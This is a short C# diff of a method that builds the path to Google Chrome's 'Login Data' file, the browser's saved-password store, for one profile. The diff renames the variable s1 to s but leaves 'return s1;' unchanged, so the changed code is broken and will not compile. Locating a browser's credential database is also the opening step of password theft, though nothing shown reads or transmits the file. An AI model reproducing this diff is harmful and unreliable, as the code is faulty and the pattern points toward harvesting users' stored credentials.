@@ -12,10 +12,10 @@
 
         public static string GetLoginDataFile()
         {
-            string s1 =  Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+            string s =  Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
     "Google", "Chrome", "User Data", "profile 6", "Login Data");
 
-            if(File.Exists(s1))
+            if(File.Exists(s))
             {
                 return s1;
             }
